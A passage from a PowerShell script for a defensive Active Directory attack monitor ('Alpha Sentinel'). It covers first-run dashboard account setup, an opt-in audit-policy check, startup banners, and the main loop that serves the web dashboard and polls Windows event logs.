    Ok        = (-not $anyError)
    Capped    = $anyCapped
    Alerts    = $newAlerts
    Evaluated = $evaluatedTotal
    Lag       = $Script:LagSeconds
  }
}

# (Stop-Sentinel / -Stop are defined near the top of this file, next to the pid
#  file they use: the old definition lived here, which meant the function only
#  existed inside the RUNNING monitor's process and could never be called from
#  a second console - exactly what the README told you to do.)

# ============================================================
# MAIN - start web server, single-threaded request/poll loop
# ============================================================

# ---- -RestoreAudit: run auditpol /restore and exit --------------------------
if ($RestoreAudit) {
  $ok = Restore-SentinelAuditPolicy $RestoreAudit
  exit $(if ($ok) { 0 } else { 1 })
}

# -ReplayPath: run exported event XML through the real engine, print the report
# and exit. No web server and no history writes - this is the fixture harness
# for field-shape bugs, the class of bug the synthetic self-test cannot see.
if ($ReplayPath) {
  Write-Host ""
  Write-Host "  ALPHA SENTINEL - replay mode (no monitoring, no dashboard)" -ForegroundColor Red
  Invoke-Replay $ReplayPath
  exit 0
}

# -Background: hide the console window. The old -Background switch did nothing
# at all - the window only vanished because the README launched the script
# through Start-Process -WindowStyle Hidden.
if ($Background) {
  try {
    if (-not ('Sentinel.Console' -as [type])) {
      Add-Type -Namespace Sentinel -Name Console -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
    }
    $h = [Sentinel.Console]::GetConsoleWindow()
    if ($h -ne [IntPtr]::Zero) { [void][Sentinel.Console]::ShowWindow($h, 0) }
  } catch { }
}

# pid file, so `-Stop` / Stop-Sentinel can find this process from any console
try { Set-Content -Path $PidFile -Value $PID -Encoding Ascii -Force } catch { }

# ---- QuickEdit guard --------------------------------------------------------
# Windows consoles default to QuickEdit: a click inside the console SELECTS
# text, and a running program's stdout blocks until the selection is cleared.
# A monitor frozen because somebody clicked the window looks exactly like a
# dead one. Clear the flag on interactive start (and restore it on exit); in a
# service/hidden console there is nothing to guard and the calls fail safe.
$Script:SavedConsoleMode = -1
$Script:ConsoleHandle = [IntPtr]::Zero
try {
  if (-not $Background -and -not ('Sentinel.ConsoleMode' -as [type])) {
    Add-Type -Namespace Sentinel -Name ConsoleMode -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr GetStdHandle(int nStdHandle);
[DllImport("kernel32.dll")] public static extern bool GetConsoleMode(IntPtr h, out uint mode);
[DllImport("kernel32.dll")] public static extern bool SetConsoleMode(IntPtr h, uint mode);
'@
  }
  if (-not $Background -and ('Sentinel.ConsoleMode' -as [type])) {
    $h = [Sentinel.ConsoleMode]::GetStdHandle(-10)   # STD_INPUT_HANDLE
    $mode = [uint32]0
    if ([Sentinel.ConsoleMode]::GetConsoleMode($h, [ref]$mode)) {
      $Script:SavedConsoleMode = $mode
      $Script:ConsoleHandle = $h
      # ENABLE_QUICK_EDIT_MODE = 0x0040, ENABLE_EXTENDED_FLAGS = 0x0080
      $newMode = ($mode -band (-bnot 0x0040)) -bor 0x0080
      [void][Sentinel.ConsoleMode]::SetConsoleMode($h, $newMode)
    }
  }
} catch { }

# audit-policy preflight BEFORE the dashboard starts reporting healthy coverage
$null = Update-AuditPreflight

# resume the per-channel poll watermarks from the previous run: no re-alerting
# the last two minutes (duplicates) and no blind spot for the downtime (gap)
$null = Restore-State

# ---- the web UI only starts when there is an account to authenticate against
# Without a users file the dashboard would be either an open port or a dead end,
# so it is not served at all. Monitoring, alerting and forwarding carry on.
$usersState = Get-UsersFileState
$listener = $null

# ---- FIRST-RUN INTERACTIVE SETUP ----
# If sentinel-users.json does not exist, prompt for admin account creation
# before starting the web server.
if (-not $usersState.ok) {
  $isInteractive = [Environment]::UserInteractive -and $null -ne $Host -and $null -ne $Host.UI -and $null -ne $Host.UI.RawUI
  $canPrompt = $isInteractive -and (-not $Unattended) -and (-not $DemoData)
  
  if ($canPrompt) {
    Write-Host ""
    Write-Host "  ============================================================" -ForegroundColor Cyan
    Write-Host "   ALPHA SENTINEL - First Run Setup" -ForegroundColor Cyan
    Write-Host "  ============================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  No dashboard account exists yet. Set one up now? (Y/n) " -NoNewline -ForegroundColor Yellow
    $answer = $null
    $deadline = (Get-Date).AddSeconds(30)
    while ((Get-Date) -lt $deadline -and -not [Console]::KeyAvailable) { Start-Sleep -Milliseconds 150 }
    if ([Console]::KeyAvailable) { $answer = [Console]::ReadKey($true).Key.ToString() }
    Write-Host $(if ($answer -eq 'Y') { 'y' } else { 'n' })
    
    if ($answer -eq 'Y') {
      # Prompt for username
      $username = ""
      while (-not $username) {
        Write-Host ""
        Write-Host "  Username (3-32 chars, A-Z a-z 0-9 . _ -): " -NoNewline -ForegroundColor Yellow
        $username = Read-Host
        if ($username -notmatch '^[A-Za-z0-9._-]{3,32}$') {
          Write-Host "  Invalid username. Must be 3-32 characters: A-Z a-z 0-9 . _ -" -ForegroundColor Red
          $username = ""
        }
      }
      
      # Prompt for password (with confirmation)
      $password = ""
      $confirm = ""
      while (-not $password -or $password -ne $confirm) {
        Write-Host ""
        $secure = Read-Host -AsSecureString "  Password (min 12 chars, must not equal username)"
        $confirmSecure = Read-Host -AsSecureString "  Confirm password"
        $password = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure))
        $confirm = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($confirmSecure))
        
        if ($password.Length -lt 12) {
          Write-Host "  Password must be at least 12 characters." -ForegroundColor Red
          $password = ""
          continue
        }
        if ($password -ceq $username) {
          Write-Host "  Password must not be identical to the username." -ForegroundColor Red
          $password = ""
          continue
        }
        if ($password -ne $confirm) {
          Write-Host "  Passwords do not match. Try again." -ForegroundColor Red
          $password = ""
        }
      }
      
      # Ask if domain-joined
      $domainJoined = $false
      Write-Host ""
      Write-Host "  Is this machine domain-joined? (Y/n) " -NoNewline -ForegroundColor Yellow
      $domainAnswer = $null
      $deadline = (Get-Date).AddSeconds(30)
      while ((Get-Date) -lt $deadline -and -not [Console]::KeyAvailable) { Start-Sleep -Milliseconds 150 }
      if ([Console]::KeyAvailable) { $domainAnswer = [Console]::ReadKey($true).Key.ToString() }
      Write-Host $(if ($domainAnswer -eq 'Y') { 'y' } else { 'n' })
      if ($domainAnswer -eq 'Y') { $domainJoined = $true }
      
      # Create the account using the EXACT same PBKDF2 function
      $iterations = 150000
      $salt = New-PasswordSalt
      $hash = Get-PasswordHash $password $salt $Script:Pbkdf2Iterations
      $now = (Get-Date).ToUniversalTime().ToString("o")
      
      $record = [PSCustomObject]@{
        user       = $username
        salt       = (ConvertTo-Hex $salt)
        hash       = (ConvertTo-Hex $hash)
        iterations = $Script:Pbkdf2Iterations
        created    = $now
        updated    = $now
        avatarColor = ''
        avatarInitials = ''
        domainJoined = $domainJoined
      }
      
      $store = [PSCustomObject]@{ version = 1; users = @($record) }
      Save-UserStore $store
      
      Write-Host ""
      Write-Host "  Account '$username' created successfully!" -ForegroundColor Green
      Write-Host "  Domain-joined: $(if ($domainJoined) { 'Yes' } else { 'No (lab mode)' })" -ForegroundColor DarkGray
      Write-Host ""
      
      # Refresh users state
      $usersState = Get-UsersFileState
    } else {
      Write-Host ""
      Write-Host "  Setup cancelled. Run with -Unattended or create an account manually with New-SentinelAdmin.ps1" -ForegroundColor Yellow
    }
  } else {
    Write-Host ""
    Write-Host "  [web] NOT STARTED - $($usersState.message)" -ForegroundColor Red
    Write-Host "  [web] Run with -Unattended or create an account manually with .\New-SentinelAdmin.ps1" -ForegroundColor Yellow
    Write-Host "  [web] Monitoring, alerting and forwarding keep running without it." -ForegroundColor Yellow
  }
}

$listener = $null
if ($usersState.ok) {
  $listener = Start-WebServer
} else {
  Write-Host ""
  Write-Host "  [web] NOT STARTED - $($usersState.message)" -ForegroundColor Red
  Write-Host "  [web] Monitoring, alerting and forwarding keep running without it." -ForegroundColor Yellow
}

Write-Host ""
Write-Host "  ============================================================" -ForegroundColor Red
Write-Host "   ALPHA SENTINEL v2.6.0 - AD / Network Attack Monitor" -ForegroundColor Red
Write-Host "  ============================================================" -ForegroundColor Red
if ($listener) {
  if (-not $Bind -or $Bind -eq 'localhost' -or $Bind -eq '127.0.0.1') {
    Write-Host "   Web dashboard : http://localhost:$Port  (sign in required; loopback only - add -Bind 0.0.0.0 to serve the LAN)" -ForegroundColor Green
  } else {
    Write-Host "   Web dashboard : http://<this-ip>:$Port  (bound to $Bind; sign in required)" -ForegroundColor Green
    Write-Host "   WARNING       : plain HTTP beyond localhost - the password and the session cookie are" -ForegroundColor Yellow
    Write-Host "                   UNENCRYPTED. Use a VPN or a trusted lab network, or put a TLS reverse" -ForegroundColor Yellow
    Write-Host "                   proxy in front of it." -ForegroundColor Yellow
  }
  Write-Host "   Sign-in       : $($usersState.message)" -ForegroundColor Green
  Write-Host ("   Sessions      : {0}h absolute, {1}min idle timeout, HttpOnly SameSite=Strict cookie" -f $Script:SessionHours, $Script:IdleMinutes) -ForegroundColor DarkGray
  Write-Host "   Auth audit    : $AuthFile"
} else {
  Write-Host "   Web dashboard : NOT SERVED (no user database - see the message above)" -ForegroundColor Red
}
Write-Host "   Polling       : $MonitoredEventIdCount event IDs across $($LogSources.Count) log channels every $PollSeconds sec (cap $MaxEventsPerPoll/poll, $CatchUpMilliseconds ms catch-up)"
Write-Host "   Rules         : $($RuleMeta.Count) families (spraying, brute force, Kerberos attacks,"
Write-Host "                   DCSync, enumeration, privesc, persistence, evasion)"
if ($ForwardUrl) { Write-Host "   Forwarding    : enabled -> $ForwardUrl" -ForegroundColor Yellow }
else { Write-Host "   Forwarding    : off (standalone mode)" -ForegroundColor DarkGray }
Write-Host "   History       : $HistoryFile"
Write-Host "   State         : $StateFile"
Write-Host "   Stop          : .\AlphaSentinel.ps1 -Stop    (or Stop-Sentinel)"
Write-Host "   Self-test     : the Self-test button, or POST /api/self-test"

$preflight = Get-PreflightReport
Write-Host ""
if (-not $preflight.readable) {
  Write-Host "   Audit preflight : could not read the audit policy - run as Administrator for coverage checks." -ForegroundColor Yellow
} elseif ($preflight.blindCount -gt 0) {
  Write-Host ("   Audit preflight : " + $preflight.blindCount + " of " + $preflight.rulesTotal + " rule families are BLIND on this host:") -ForegroundColor Yellow
  foreach ($b in $preflight.blind) {
    Write-Host ("                     - " + $b.key + " needs " + $b.need + " on '" + $b.subcategory + "'") -ForegroundColor Yellow
  }
  # PowerShell-SAFE commands: pasted as-is, the whole /subcategory:"..." reaches
  # auditpol as one argument instead of losing its inner quotes to PowerShell
  foreach ($f in $preflight.fix) { Write-Host ("                     " + $f + "   # works when pasted: the quoted argument survives") -ForegroundColor DarkYellow }
  Write-Host "                     or restart with -EnableAudit and the monitor sets them (with a backup first)."
  # ---- opt-in prompt: interactive console + blind rules + no -EnableAudit ----
  if ($EnableAudit) {
    $null = Enable-SentinelAuditPolicy
  } elseif (-not $Background -and [Environment]::UserInteractive -and -not $Unattended) {
    try {
      Write-Host ""
      Write-Host ("  " + $preflight.blindCount + " rules are blind. Enable the required audit policy now? [y/N] ") -NoNewline -ForegroundColor Yellow
      $answer = $null
      $deadline = (Get-Date).AddSeconds(15)
      while ((Get-Date) -lt $deadline -and -not [Console]::KeyAvailable) { Start-Sleep -Milliseconds 150 }
      if ([Console]::KeyAvailable) { $answer = [Console]::ReadKey($true).Key.ToString() }
      Write-Host $(if ($answer -eq 'Y') { 'y' } else { 'N (default - nothing changed)' })
      if ($answer -eq 'Y') { $null = Enable-SentinelAuditPolicy }
    } catch {
      Write-Host "  (no interactive console - skipping the audit-policy prompt)"
    }
  }
} else {
  Write-Host ("   Audit preflight : all " + $preflight.okCount + " policy-gated rule families can fire (" + $preflight.naCount + " are not policy-gated).") -ForegroundColor Green
}
Write-Host ""
Write-Host "   Press Ctrl+C to stop. Dashboard serves while this runs." -ForegroundColor DarkGray
Write-Host ""

# MAIN LOOP - a single thread drains web requests AND polls the event log.
# PowerShell scriptblocks cannot run on .NET ThreadPool threads without a
# runspace, so both loops live on the main thread; the 250 ms sleep keeps the
# loop nearly idle. Works on PS 5.1 / Windows Server 2012.
$Script:NextPoll = (Get-Date).AddSeconds(1)
$Script:PendingTask = $null
$Script:NextUsersReminder = (Get-Date).AddSeconds(60)
try {
  while ($true) {
    if ($null -ne $listener) {
      if ($null -ne $Script:PendingTask -and $Script:PendingTask.IsCompleted) {
        $ctx = $Script:PendingTask.Result
        $Script:PendingTask = $null
        $null = Invoke-Handler $ctx
        continue   # drain any further queued requests immediately
      }
      if ($null -eq $Script:PendingTask) {
        $Script:PendingTask = $listener.GetContextAsync()
      }
      Remove-ExpiredSessions
    } elseif ((Get-Date) -ge $Script:NextUsersReminder) {
      # no dashboard: keep reminding the admin, but not on every 250 ms tick
      Write-Host "  [web] still not served - $($usersState.message)" -ForegroundColor DarkYellow
      $Script:NextUsersReminder = (Get-Date).AddMinutes(5)
    }
    if ((Get-Date) -ge $Script:NextPoll) {
      $pollResult = Invoke-PollOnce
      # A capped poll retries in -CatchUpMilliseconds (200 ms) instead of a whole
      # -PollSeconds: at the 500-event cap a full interval is only ~33
      # events/second, so a backlog would never drain on a busy DC.
      $delay = Get-NextPollDelaySeconds $pollResult.Capped
      $Script:NextPoll = (Get-Date).AddSeconds($delay)
    }
    Start-Sleep -Milliseconds 250
  }
} finally {
  if ($listener) { try { $listener.Stop() } catch { } }
  Save-History
  Save-State
  Remove-Item $PidFile -Force -ErrorAction SilentlyContinue
  try {
    if ($Script:SavedConsoleMode -ge 0 -and $Script:ConsoleHandle -ne [IntPtr]::Zero) {
      [void][Sentinel.ConsoleMode]::SetConsoleMode($Script:ConsoleHandle, [uint32]$Script:SavedConsoleMode)
    }
  } catch { }
}
